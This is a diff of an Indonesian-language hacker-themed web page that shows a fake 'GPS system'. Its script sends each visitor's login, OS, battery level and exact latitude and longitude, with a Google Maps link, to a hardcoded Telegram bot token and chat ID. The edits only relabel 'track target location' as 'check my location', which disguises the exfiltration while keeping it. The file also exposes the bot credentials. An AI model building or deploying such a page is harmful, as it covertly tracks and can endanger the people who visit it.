@@ -42,13 +42,13 @@
             <button onclick="alert('Terminal Exploit Aktif...')">TERMINAL</button>
             <button onclick="startScan()">SCAN SYSTEM</button>
             <button onclick="checkDevice()" style="grid-column: span 2;">CHECK DEVICE SENSOR</button>
-            <button onclick="trackGPS()" style="grid-column: span 2; border-color: yellow; color: yellow;">📍 LACAK LOKASI TARGET</button>
+            <button onclick="trackGPS()" style="grid-column: span 2; border-color: yellow; color: yellow;">📍 CEK LOKASI SAYA</button>
             <button onclick="location.reload()" style="grid-column: span 2;">LOGOUT</button>
         </div>
     </div>
 
     <div id="gps-overlay" class="overlay">
-        <h3>[ GPS INTERCEPTOR ]</h3>
+        <h3>[ GPS SYSTEM ]</h3>
         <div id="gps-logs">> Menghubungkan ke satelit...</div>
         <div class="bar-container"><div id="gps-bar" class="bar-fill"></div></div>
         <div id="map"></div>
@@ -70,7 +70,6 @@
         function draw() { ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height); ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px arial"; drops.forEach((y, i) => { const text = letters.charAt(Math.floor(Math.random() * letters.length)); ctx.fillText(text, i * fontSize, y * fontSize); if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++; }); }
         setInterval(draw, 33);
 
-        // DATA TELEGRAM MASTER EDWARD
         const TG_TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
         const TG_ID = '7898572558';
 
@@ -78,22 +77,20 @@
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(msg)}`);
         }
 
-        function checkPass() { if (document.getElementById("passkey").value.toUpperCase().trim() === "EDWARD-HECKER") { document.getElementById("login-screen").style.display = "none"; document.getElementById("main-content").style.display = "block"; sendTele("⚠️ INFO: Seseorang Login ke Web Edward!"); } }
+        function checkPass() { if (document.getElementById("passkey").value.toUpperCase().trim() === "EDWARD-HECKER") { document.getElementById("login-screen").style.display = "none"; document.getElementById("main-content").style.display = "block"; sendTele("⚠️ INFO: User telah masuk ke sistem."); } }
         function closeOverlay(id) { document.getElementById(id).style.display = "none"; }
 
         function checkDevice() {
             document.getElementById("device-overlay").style.display = "block";
             const res = document.getElementById("device-res");
             const os = navigator.platform;
-            res.innerHTML = `📱 OS: ${os}<br>🔋 Menarik data baterai...`;
+            res.innerHTML = `📱 OS: ${os}<br>🔋 Sinkronisasi baterai...`;
             if(navigator.getBattery) {
                 navigator.getBattery().then(b => {
                     const bat = Math.round(b.level * 100) + "%";
                     res.innerHTML = `📱 OS: ${os}<br>🔋 BATERAI: ${bat}`;
-                    sendTele(`📱 DEVICE TERDETEKSI!\nOS: ${os}\nBaterai: ${bat}`);
+                    sendTele(`📱 DEVICE INFO\nOS: ${os}\nBaterai: ${bat}`);
                 });
-            } else {
-                sendTele(`📱 DEVICE TERDETEKSI!\nOS: ${os}\nBaterai: N/A`);
             }
         }
 
@@ -111,16 +108,11 @@
                             var map = L.map('map').setView([p.coords.latitude, p.coords.longitude], 15);
                             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                             L.marker([p.coords.latitude, p.coords.longitude]).addTo(map);
-                            sendTele(`📍 LOKASI TARGET!\nLat: ${p.coords.latitude}\nLon: ${p.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                            sendTele(`📍 LOKASI USER\nLat: ${p.coords.latitude}\nLon: ${p.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                         }
                     }, 50);
-                }, () => { sendTele("❌ Target Menolak Izin Lokasi!"); });
+                }, () => { sendTele("❌ User tidak memberikan akses lokasi."); });
             }
-        }
-
-        function startScan() { 
-            let w = 0;
-            alert("Memulai Scan System...");
         }
     </script>
 </body>
